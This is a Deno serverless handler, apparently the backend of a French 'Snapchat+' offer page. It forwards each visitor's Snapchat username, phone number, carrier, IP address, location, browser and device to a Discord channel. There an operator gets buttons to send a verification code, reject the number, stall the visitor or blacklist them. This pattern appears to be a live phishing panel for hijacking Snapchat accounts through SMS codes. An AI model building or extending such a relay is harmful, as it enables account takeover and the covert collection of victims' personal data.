import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';

const BOT_TOKEN = Deno.env.get("DISCORD_BOT_TOKEN");
const CHANNEL_ID = "1512395679958302843";

async function sendBotMessage(payload) {
  return fetch(`https://discord.com/api/v10/channels/${CHANNEL_ID}/messages`, {
    method: "POST",
    headers: { "Content-Type": "application/json", "Authorization": `Bot ${BOT_TOKEN}` },
    body: JSON.stringify(payload),
  });
}

Deno.serve(async (req) => {
  const authHeader = req.headers.get("authorization") || "";
  const token = authHeader.replace("Bearer ", "");
  const expectedToken = Deno.env.get("WEBHOOK_SECRET");
  if (expectedToken && token !== expectedToken) {
    return Response.json({ error: "Unauthorized" }, { status: 401 });
  }

  const base44 = createClientFromRequest(req);
  const body = await req.json();
  const { snapchat, telephone, operateur, submissionId, ip, country, city, browser, device } = body;

  const formatPhone = (tel) => tel.replace(/(\d{2})(?=\d)/g, '$1 ').trim();
  const formatPhoneRaw = (tel) => tel.replace(/\D/g, '').slice(-10);

  // Use all data from body parameters
  const finalIp = ip || "Inconnue";
  const finalCountry = country || "France";
  const finalCity = city || "Inconnue";
  const finalBrowser = browser || "Inconnu";
  const finalDevice = device || "Inconnu";
  
  const operatorColors = { SFR: 16711680, Bouygues: 3447003, Orange: 16753920 };

  const now = new Date();
  const dateStr = now.toLocaleDateString("fr-FR", {
    weekday: "long", day: "numeric", month: "long", year: "numeric",
    hour: "2-digit", minute: "2-digit", second: "2-digit",
    timeZone: "Europe/Paris"
  });

  const embed = {
    title: "📱 Nouvelle soumission Snapchat+",
    color: operatorColors[operateur] || 16776960,
    fields: [
      { name: "👤 Utilisateur", value: `@${snapchat}`, inline: true },
      { name: "📡 Opérateur", value: operateur, inline: true },
      { name: "📞 Numéro", value: formatPhone(telephone), inline: true },
      { name: "🌍 Pays", value: finalCountry, inline: true },
      { name: "🏙️ Ville", value: finalCity, inline: true },
      { name: "🌐 Navigateur", value: finalBrowser, inline: true },
      { name: "💾 Appareil", value: finalDevice, inline: true },
      { name: "🕵️ Adresse IP", value: `\`${finalIp}\``, inline: false },
      { name: "🕐 Date de soumission", value: dateStr, inline: false },
    ],
    footer: { text: `ID: ${submissionId || "N/A"}` },
    timestamp: now.toISOString(),
  };

  const appUrl = Deno.env.get("APP_URL") || "https://app.base44.com";

  const embed2 = {
    fields: [
      {
        name: "⚡ Actions",
        value: `✅ [Envoyer le code](${appUrl}/action?trigger=${submissionId})\n❌ [Mauvais numéro](${appUrl}/action?action=wrong&id=${submissionId})\n⏳ [Faire patienter](${appUrl}/action?action=wait&id=${submissionId})\n🚫 [Blacklist instant](${appUrl}/action?action=blacklist&id=${submissionId}&ip=${finalIp})`,
        inline: false,
      }
    ],
    color: operatorColors[operateur] || 16776960,
  };

  await sendBotMessage({ embeds: [embed, embed2] });

  await base44.asServiceRole.entities.ActionLog.create({
    submission_id: submissionId,
    action: "submitted",
    details: { browser: finalBrowser, device: finalDevice, ip: finalIp, country: finalCountry, city: finalCity },
    timestamp: now.toISOString()
  });

  return Response.json({ ok: true });
});